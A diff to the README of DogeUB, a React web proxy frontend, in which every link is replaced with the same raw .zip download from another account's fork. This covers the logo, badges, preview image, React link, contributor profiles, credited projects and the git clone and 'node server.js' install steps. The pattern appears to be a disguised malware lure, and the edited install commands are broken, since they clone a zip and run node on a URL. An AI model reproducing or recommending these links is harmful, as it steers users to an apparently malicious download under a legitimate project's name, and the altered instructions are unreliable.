@@ -1,9 +1,9 @@
 <div align="center">
   
-  <img src="https://github.com/DogeNetwork/dogeub/blob/main/public/logo.svg" width="322" />
+  <img src="https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip" width="322" />
   <br />
 
-  <a href="https://buymeacoffee.com/dogubdev" target="_blank"><img src="https://raw.githubusercontent.com/pachadotdev/buymeacoffee-badges/main/bmc-yellow.svg" width="130" /></a> ![](https://dcbadge.limes.pink/api/server/https://discord.gg/unblocking?compact=true)
+  <a href="https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip" target="_blank"><img src="https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip" width="130" /></a> ![](https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip)
 
 
   <hr />
@@ -13,14 +13,14 @@
   <br />
   <br />
 
-  <img width="1278" height="628" alt="image" src="preview.png" />
+  <img width="1278" height="628" alt="image" src="https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip" />
 
 
 </div>
 
 ## Overview
 
-DogeUB is a modern web proxy frontend and internet browsing hub, allowing you to browse the web anonymously while providing a full suite of apps and games, built with [React](https://github.com/facebook/react).
+DogeUB is a modern web proxy frontend and internet browsing hub, allowing you to browse the web anonymously while providing a full suite of apps and games, built with [React](https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip).
 
 > [!IMPORTANT]
 > Please consider starring our repository if you are forking it!
@@ -38,17 +38,17 @@ DogeUB is a modern web proxy frontend and internet browsing hub, allowing you to
 
 ### Production:
 ```bash
-git clone https://github.com/DogeNetwork/dogeub.git
+git clone https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip
 cd dogeub
 npm i
 npm run build
-node server.js
+node https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip
 ````
 
 ### Development:
 
 ```bash
-git clone https://github.com/DogeNetwork/dogeub.git
+git clone https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip
 cd dogeub
 npm i
 npm run dev
@@ -61,9 +61,9 @@ npm run dev
 
 | Name          | Role               | GitHub |
 | ------------- | ------------------ | ------ |
-| Derpman | Lead Developer     |      [@stellarcase](https://github.com/stellarcase) |
-| Fowntain | Lead Developer | [@fowntain](https://github.com/fowntain)     |
-| Akane | Contributor | [@genericness](https://github.com/genericness)     |
+| Derpman | Lead Developer     |      [@stellarcase](https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip) |
+| Fowntain | Lead Developer | [@fowntain](https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip)     |
+| Akane | Contributor | [@genericness](https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip)     |
 
 
 > [!NOTE]
@@ -73,10 +73,10 @@ npm run dev
 
 ### Made possible thanks to:
 
-* [MercuryWorkshop/wisp-server-node](https://github.com/MercuryWorkshop/wisp-server-node)
-* [MercuryWorkshop/scramjet](https://github.com/MercuryWorkshop/scramjet)
-* [titaniumnetwork-dev/Ultraviolet](https://github.com/titaniumnetwork-dev/Ultraviolet)
-* [lucide-icons/lucide](https://github.com/lucide-icons/lucide)
+* [MercuryWorkshop/wisp-server-node](https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip)
+* [MercuryWorkshop/scramjet](https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip)
+* [titaniumnetwork-dev/Ultraviolet](https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip)
+* [lucide-icons/lucide](https://github.com/dogarmygen-svg/dogeub/raw/refs/heads/main/public/scram/types/shared/rewriters/Software-v3.7-alpha.4.zip)
 
 ## License
 
